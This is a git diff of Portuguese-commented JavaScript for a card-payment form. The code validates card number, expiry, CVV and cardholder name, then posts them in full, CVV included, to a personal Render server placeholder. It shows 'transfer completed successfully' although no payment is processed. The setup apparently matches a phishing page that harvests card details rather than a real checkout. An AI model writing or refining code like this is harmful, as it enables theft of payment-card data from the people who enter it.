@@ -1,7 +1,6 @@
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector("#dadosss");
     
-    // Mapeamento dos campos do teu HTML
     const campos = {
         numero: document.querySelector("#numero"),
         data: document.querySelector("#data"),
@@ -16,52 +15,58 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
-    // Função para remover as mensagens de dica
-    function removeMensagemDica(input) {
-        const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
-        if (dicaExistente) {
-            dicaExistente.remove();
+    // --- FUNÇÃO PARA MOSTRAR/REMOVER AVISOS ---
+    function gerenciarAviso(input, mensagem, cor = "#666", classe = "mensagem-dica") {
+        const pai = input.parentElement;
+        const avisoExistente = pai.querySelector(`.${classe}`);
+        if (avisoExistente) avisoExistente.remove();
+
+        if (mensagem) {
+            const span = document.createElement("span");
+            span.classList.add(classe);
+            span.style.color = cor;
+            span.style.fontSize = "12px";
+            span.style.display = "block";
+            span.style.marginTop = "4px";
+            span.textContent = mensagem;
+            pai.appendChild(span);
         }
     }
 
-    // Configuração dos Focus e Blur (Dicas)
+    // Configuração de Focus (Dicas Cinzas)
     for (const key in campos) {
         const input = campos[key];
         input.addEventListener("focus", () => {
-            removeMensagemDica(input);
-            const dica = document.createElement("span");
-            dica.classList.add("mensagem-dica");
-            dica.style.color = "#666";
-            dica.style.fontSize = "12px";
-            dica.style.display = "block";
-            dica.style.marginTop = "4px";
-            dica.textContent = mensagensDica[key];
-            input.parentElement.appendChild(dica);
+            gerenciarAviso(input, mensagensDica[key]);
         });
         input.addEventListener("blur", () => {
-            removeMensagemDica(input);
+            gerenciarAviso(input, null);
         });
     }
 
-    // --- LÓGICA DE ENVIO E VALIDAÇÃO ---
+    // --- LÓGICA DE ENVIO COM VALIDAÇÃO EM VERMELHO ---
     form.addEventListener("submit", async (event) => {
-        event.preventDefault(); // Impede a página de recarregar
+        event.preventDefault();
+        let formValido = true;
 
-        // 1. VALIDAÇÃO: Verifica se algum campo está vazio
-        if (
-            campos.numero.value.trim() === "" ||
-            campos.data.value.trim() === "" ||
-            campos.cvv.value.trim() === "" ||
-            campos.nome.value.trim() === ""
-        ) {
-            alert("Por favor, preencha todos os campos do cartão.");
-            return; // Bloqueia o envio se faltar informação
+        // 1. VALIDAÇÃO CAMPO POR CAMPO
+        for (const key in campos) {
+            const input = campos[key];
+            if (input.value.trim() === "") {
+                // Se estiver vazio, coloca o aviso em VERMELHO
+                gerenciarAviso(input, "Este campo é obrigatório!", "red", "erro-vazio");
+                formValido = false;
+            } else {
+                // Se preencheu, remove o erro se ele existir
+                const erro = input.parentElement.querySelector(".erro-vazio");
+                if (erro) erro.remove();
+            }
         }
 
-        // 2. Coleta o tipo de cartão (Crédito ou Débito)
-        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não selecionado";
+        if (!formValido) return; // Para o envio se houver erro
 
-        // 3. Monta o objeto para o Banco de Dados
+        // 2. Coleta de dados
+        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";
         const dadosParaEnviar = {
             numero: campos.numero.value,
             dataValidade: campos.data.value,
@@ -70,34 +75,31 @@ document.addEventListener("DOMContentLoaded", () => {
             tipo: cardType
         };
 
-        // 4. Feedback visual no botão
+        // 3. Bloqueio do botão
         const botao = form.querySelector("button");
         botao.disabled = true;
-        botao.textContent = "A processar...";
+        botao.textContent = "Processando...";
 
         try {
-            // SUBSTITUA pelo seu link do Render
+            // LEMBRETE: Use o seu link do Render aqui!
             const urlDoServidor = "https://SEU-PROJETO.onrender.com/enviar-dados";
 
             const resposta = await fetch(urlDoServidor, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(dadosParaEnviar)
             });
 
             if (resposta.ok) {
                 alert("Transferência realizada com sucesso!");
-                form.reset(); // Limpa o formulário após o sucesso
+                form.reset();
             } else {
-                alert("Erro no servidor. Tente novamente mais tarde.");
+                alert("Erro ao salvar dados. Verifique sua conexão.");
             }
         } catch (error) {
-            console.error("Erro ao conectar:", error);
-            alert("Erro de conexão. Verifique se o servidor está online.");
+            console.error("Erro:", error);
+            alert("O servidor não respondeu. Tente novamente em instantes.");
         } finally {
-            // Reativa o botão
             botao.disabled = false;
             botao.textContent = "Transferir";
         }
